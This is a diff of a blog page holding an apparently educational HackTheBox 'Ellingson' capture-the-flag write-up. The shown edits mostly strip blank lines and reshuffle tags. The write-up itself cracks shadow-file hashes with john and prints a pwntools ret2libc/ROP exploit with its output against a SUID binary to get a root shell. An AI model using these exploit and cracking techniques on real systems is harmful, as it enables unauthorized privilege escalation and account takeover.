@@ -117,7 +117,6 @@ require the exploitation of a ROP buffer overflow.</p>
 <span class="code-line"># Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds</span>
 <span class="code-line"></code></pre></div>
 
-
 <h1 id="web">Web</h1>
 <p>The website is a standard corporate website (we can appreciate the dynamic rendering).</p>
 <p><img alt="Ellingson web page" src="/media/2019.10/ellingson_1.png"></p>
@@ -140,7 +139,6 @@ SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
 <span class="code-line">0</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>As our SSH public key is in hal's <code>authorzied_key</code> we can connect as hal using
 SSH and starting to enumerate. The user flag is not in the hal's home folder:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>sh 10.10.10.139 -lhal</span>
@@ -149,7 +147,6 @@ SSH and starting to enumerate. The user flag is not in the hal's home folder:</p
 <span class="code-line">hal@ellingson:~$ ls /home/</span>
 <span class="code-line">duke  hal  margo  theplague</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We enumerate the box and find an interesting non standard SUID binary:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
@@ -178,7 +175,6 @@ SSH and starting to enumerate. The user flag is not in the hal's home folder:</p
 <span class="code-line">/bin/fusermount</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>Nevertheless we do not have the permission to execute it:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ ls -al /usr/bin/garbage</span>
 <span class="code-line">-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage</span>
@@ -186,12 +182,10 @@ SSH and starting to enumerate. The user flag is not in the hal's home folder:</p
 <span class="code-line">User is not authorized to access this application. This attempt has been logged.</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We need another way. We see that we are in the group <code>adm</code> (in addition to our user group):</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ id</span>
 <span class="code-line">uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)</span>
 <span class="code-line"></code></pre></div>
-
 
 <p><strong>I struggled for a long time here before someone on the official discord told
 me that after a few hours
@@ -227,7 +221,6 @@ anymore. I had to reset the box to find this file.</strong></p>
 <span class="code-line">/snap/core/6818/var/log/fsck/checkroot</span>
 <span class="code-line">/snap/core/6818/var/spool/rsyslog</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We cat the shadow.bak file and get some password hashes:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ cat /var/backups/shadow.bak</span>
@@ -266,7 +259,6 @@ anymore. I had to reset the box to find this file.</strong></p>
 <span class="code-line">duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
 use <code>john</code> with the rockyou dictionary.</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt</span>
@@ -274,7 +266,6 @@ use <code>john</code> with the rockyou dictionary.</p>
 <span class="code-line">theplague:password123:17964:0:99999:7:::</span>
 <span class="code-line">margo:iamgod$08:17964:0:99999:7:::</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>The first password was changed, as mention in the third article:</p>
 <blockquote>
@@ -294,7 +285,6 @@ retrieved the user flag:</p>
 <span class="code-line">d0ff9e&lt;redacted&gt;</span>
 <span class="code-line"></code></pre></div>
 
-
 <h1 id="root">Root</h1>
 <h2 id="finding-the-suid-binary">Finding the SUID binary</h2>
 <p>Let's get back to the SUID binary:</p>
@@ -310,7 +300,6 @@ retrieved the user flag:</p>
 <span class="code-line">/usr/bin/chfn</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We run the binary, it ask for a password user input. If we put a wrong password
 we get an access denied. If we put a "long" password we get a segfault. This
 look like a buffer overflow:</p>
@@ -325,11 +314,9 @@ look like a buffer overflow:</p>
 <span class="code-line">Segmentation fault (core dumped)</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>Let's copy the binary on our machine:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/usr/bin/garbage ./</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We check the flags of the binary:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# gdb ./garbage</span>
@@ -342,19 +329,16 @@ look like a buffer overflow:</p>
 <span class="code-line">RELRO     : Partial</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>The No-Execute bit is set. Therefore we need to use a ret2lib.</p>
 <p>The ASLR is activated on the server:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space</span>
 <span class="code-line">2</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
 to do a ROP:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./</span>
 <span class="code-line"></code></pre></div>
-
 
 <h2 id="analysing-the-buffer-overflow">Analysing the Buffer Overflow</h2>
 <p><a href="/media/2019.10/ellingson_garbage"><em>The binary is avalible here</em></a></p>
@@ -388,7 +372,6 @@ the size of the buffer.</p>
 <span class="code-line">overflow)</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>The buffer size is 136 (133+3). We could also use the peda's functions
 <code>pattern_create</code> and <code>pattern_offset</code> to find it. Then we can start to write our exploitation
 script using <a href="http://pwntools.com">pwntools</a>:</p>
@@ -410,7 +393,6 @@ script using <a href="http://pwntools.com">pwntools</a>:</p>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We want to get the dynamic address of <code>LIBC</code> in order to be able to call a
 specific function (let's say <code>/bin/sh</code>). For that we need:</p>
@@ -460,7 +442,6 @@ objdump -D garbage | grep puts
 <span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <p>Here is the output of it (for sanity I commented the debugging option):</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code># python exploitP.py</span>
 <span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1407</span>
@@ -490,7 +471,6 @@ objdump -D garbage | grep puts
 <span class="code-line">[*] Stopped process &#39;./garbage&#39; (pid 1415)</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We got the leaked address of the <code>puts</code> call in LIBC.
 As the ASLR is on, multiple runs give us different addresses for the <code>puts</code> call
 in LIBC. But our process logically stop. If we rerun it the address will be
@@ -500,7 +480,6 @@ different. Therefore we need to recall our main. We get the address using
 <span class="code-line">  401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;</span>
 <span class="code-line">0000000000401619 &lt;main&gt;:</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>And we add it to our script:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
@@ -529,7 +508,6 @@ different. Therefore we need to recall our main. We get the address using
 <span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <h2 id="ret2libc-locally">ret2libc locally</h2>
 <p>We have the leak address of the <code>puts</code> call in <code>LIBC</code>. We can dynamically
 compute the offset between our leaked address and the <code>LIBC</code> address. For that
@@ -537,7 +515,6 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code># locate libc.so.6</span>
 <span class="code-line">/lib/x86_64-linux-gnu/libc.so.6</span>
 <span class="code-line"></code></pre></div>
-
 
 <p># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
    194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
@@ -553,12 +530,10 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <span class="code-line">183cee /bin/sh</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>As we want to exploit a SUID binary we also need to invoke the <code>setuid</code> call:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid</span>
 <span class="code-line">    25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>Our exploit is now the following:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
@@ -611,7 +586,6 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <p>When running the script we grab a shell (as I use my Kali VM on root we don't
 see a real privilege escalation):</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code># python exploit.py</span>
@@ -630,7 +604,6 @@ see a real privilege escalation):</p>
 <span class="code-line">$ id</span>
 <span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
 <span class="code-line"></code></pre></div>
-
 
 <h2 id="running-the-exploit-remotely">Running the exploit remotely</h2>
 <p>In order to run the exploit remotely we need to change the <code>LIBC</code> addresses with
@@ -696,7 +669,6 @@ scrip is now:</p>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <p>The output of the script give us a root shell on the machine:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# python exploitR.py</span>
 <span class="code-line">[+] Connecting to 10.10.10.139 on port 22: Done</span>
@@ -760,7 +732,6 @@ scrip is now:</p>
 <span class="code-line">1cc73&lt;redacterd&gt;</span>
 <span class="code-line"></code></pre></div>
 
-
 <h1 id="wrapping-up">Wrapping up</h1>
 <p>What a journey! Exploiting this buffer overflow allow me to learn a lot about
 <a href="http://pwntools.com">pwntools</a>. The binary manipulation is a bit strange as
@@ -806,7 +777,6 @@ and make it compute the addresses automatically:</p>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
 <span class="code-line"></code></pre></div>
-
 
 <p>But this won't "fully" work as the SUID part is not in it.</p>
     </div>
@@ -890,116 +860,203 @@ and make it compute the addresses automatically:</p>
     <h3 class="title module-title">Tags</h3>
 
     <ul>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">Linux</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+            </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
             </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/memcache.html">memcache</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/phs.html">PHS</a>
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vb.html">VB</a>
+              <a href="https://maggick.fr/tag/server.html">server</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/restic.html">restic</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
               <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/docker.html">docker</a>
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/linux.html">Linux</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/upload.html">Upload</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+              <a href="https://maggick.fr/tag/phs.html">PHS</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/web.html">web</a>
             </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/ssl.html">SSL</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
+              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/bypass.html">bypass</a>
@@ -1007,173 +1064,92 @@ and make it compute the addresses automatically:</p>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/webmin.html">webmin</a>
             </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
             <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/waf.html">WAF</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
             </li>
             <li class="tag tag-2">
               <a href="https://maggick.fr/tag/windows.html">Windows</a>
             </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openemr.html">openEMR</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">CVE</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nano.html">nano</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/redis.html">redis</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/net.html">.NET</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/blog.html">blog</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/azure.html">Azure</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/xss.html">XSS</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/smb.html">SMB</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/impacket.html">impacket</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/re.html">RE</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/pth.html">PTH</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/dll.html">DLL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-2">
               <a href="https://maggick.fr/tag/misc.html">misc</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
     </ul>
 </section>
